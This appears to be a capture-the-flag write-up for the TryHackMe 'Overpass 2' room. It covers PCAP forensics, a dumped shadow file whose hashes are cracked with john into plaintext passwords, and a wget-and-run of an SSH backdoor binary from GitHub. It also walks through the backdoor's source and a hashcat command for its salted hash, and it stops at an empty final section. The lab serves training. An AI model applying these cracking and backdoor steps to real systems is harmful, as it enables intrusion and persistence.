# Overpass 2 hacked

| [![Overpass](../../_static/images/overpass.png)](https://tryhackme.com/room/overpass2hacked) |
|:--:|
| [https://tryhackme.com/room/overpass2hacked](https://tryhackme.com/room/overpass2hacked) |

Overpass has been hacked. Analyse the attacker’s actions and hack back in.

## Forensics - Analyse the PCAP

Open the `pcap` file in Wireshark and analyze the HTTP traffic (enter http as filter). 
Right-click on the first HTTP frame and select "Follow > TCP Stream":

| ![URL](../../_static/images/Screenshot from 2022-10-02 00-57-01.png) |
|:--:|
| The URL of the page used to upload a reverse shell |

| ![Payload](../../_static/images/Screenshot from 2022-10-02 00-55-58.png) |
|:--:|
| Payload used to gain access |

| ![Password](../../_static/images/Screenshot from 2022-10-02 00-56-30.png) |
|:--:|
| Password used to escalate privileges |

| ![Backdoor](../../_static/images/Screenshot from 2022-10-02 00-54-27.png) |
|:--:|
| Backdoor for persistence |

Before downloading the SSH backdoor, the attacker has dumped the content of the `/etc/shadow` file:

```text
root:*:18295:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
sshd:*:18464:0:99999:7:::
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
```

Save in a file named `shadow.txt` and crack it with `john` against the `fasttrack` wordlist to find how many passwords were 
crackable:

    # john shadow.txt --wordlist=/usr/share/wordlists/fasttrack.txt
    Using default input encoding: UTF-8
    Loaded 5 password hashes with 5 different salts (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
    Cost 1 (iteration count) is 5000 for all loaded hashes
    Will run 4 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    secret12         (bee)     
    abcd123          (szymex)     
    1qaz2wsx         (muirland)     
    secuirty3        (paradox)     
    4g 0:00:00:00 DONE (2022-10-02 01:00) 22.22g/s 1233p/s 6166c/s 6166C/s Spring2017..starwars
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed.

## Research - Analyse the code

Download the backdoor to figure out the default hash for the backdoor:

    $ wget https://github.com/NinjaJc01/ssh-backdoor/raw/master/backdoor
    $ chmod +x backdoor 
    $ ./backdoor --help
    backdoor
    
      Flags: 
           --version       Displays the program version string.
        -h --help          Displays help with available flag, subcommand, and positional value parameters.
        -p --port          Local port to listen for SSH on (default: 2222)
        -i --interface     IP address for the interface to listen on (default: 0.0.0.0)
        -k --key           Path to private key for SSH server (default: id_rsa)
        -f --fingerprint   SSH Fingerprint, excluding the SSH-2.0- prefix (default: OpenSSH_8.2p1 Debian-4)
        -a --hash          Hash for backdoor (default: bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3)

The source code of the backdoor (`main.go`) shows the hardcoded SALT (bottom of file):

```text
func passwordHandler(_ ssh.Context, password string) bool {
	return verifyPass(hash, "1c362db832f3f864c8c2fe05f2002a05", password)
}
```

| ![Hash](../../_static/images/Screenshot from 2022-10-02 01-09-12.png) |
|:--:|
| Hash used by the attacker |

```text
func hashPassword(password string, salt string) string {
    hash := sha512.Sum512([]byte(password + salt))
    return fmt.Sprintf("%x", hash)
}
```

The hardcoded salt is appended to the password, and the SHA512 of the resulting string makes the hash.

Save `hash:salt` to file `overpasshash.txt`:

    6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05

Crack with `hashcat` using mode `1710` for `sha512($pass.$salt)`:

    # hashcat --force -m 1710 -a 0 overpasshash.txt /usr/share/wordlists/rockyou.tx

## Hack back in